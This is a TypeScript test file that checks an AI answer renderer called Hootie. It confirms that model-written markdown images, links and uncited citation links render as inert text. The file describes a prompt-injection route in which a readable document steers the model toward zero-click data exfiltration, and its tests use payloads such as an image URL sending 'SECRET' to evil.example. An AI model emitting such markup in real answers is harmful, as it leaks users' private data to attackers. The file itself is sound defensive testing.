/**
 * Hootie's answer renderer is a whitelist: the answer is model-written, and a
 * document the asker can read can steer the model. Nothing in an answer may be
 * fetched by the browser or become clickable unless the server resolved it
 * (security review F2: zero-click exfiltration via images and links).
 */
import { describe, it, expect } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { HootieAnswerMarkdown } from "./HootieAnswer";

const secret = { id: "nodes/secret", title: "Secret" };
const plan = { id: "nodes/q3-plan", title: "Q3 Plan" };
const html = (content: string, cited = [plan]) =>
  renderToStaticMarkup(
    <HootieAnswerMarkdown content={content} cited={cited} nestId="n1" onOpenNode={() => {}} />,
  );

describe("HootieAnswerMarkdown — nothing fetched, nothing clickable unless cited", () => {
  it("an image renders as its alt text only — no <img>, nothing fetched", () => {
    const h = html("Look: ![leak](https://evil.example/p?d=SECRET) and ![](https://evil.example/q)");
    expect(h).not.toMatch(/<img/i);
    expect(h).not.toContain("evil.example");
    expect(h).toContain("leak");
  });

  it("a reference-style image is not fetched either", () => {
    const h = html("![x][r]\n\n[r]: https://evil.example/r");
    expect(h).not.toMatch(/<img/i);
    expect(h).not.toContain("evil.example");
  });

  it("an external link, an autolink and a raw URL render as plain text", () => {
    const h = html("[click](https://evil.example/a) <https://evil.example/b> https://evil.example/c");
    expect(h).not.toMatch(/<a\b/i);
    expect(h).not.toMatch(/href=/i);
    expect(h).toContain("click");
  });

  it("a #cite: link the model wrote for an id NOT in cited is plain text, not a chip", () => {
    const h = html("[open me](#cite:nodes%2Fsecret)");
    expect(h).not.toContain("hootie-citation");
    expect(h).not.toMatch(/<button/i);
    expect(h).toContain("open me");
  });

  it("a malformed #cite: id renders as text and doesn't throw", () => {
    const h = html("[bad](#cite:%E0%A4%A)");
    expect(h).not.toContain("hootie-citation");
    expect(h).toContain("bad");
  });

  it("a cited node becomes a chip — via [[link]] or a #cite: for a cited id", () => {
    const h = html("See [[q3-plan]] and [again](#cite:nodes%2Fq3-plan).");
    expect(h.match(/data-testid="hootie-citation"/g)).toHaveLength(2);
    expect(h).toContain("Q3 Plan");
    // Cited [[links]] only: a link to an uncited node stays text.
    expect(html("[[Secret]]", [plan])).not.toContain("hootie-citation");
    expect(html("[[Secret]]", [plan, secret])).toContain("hootie-citation");
  });
});
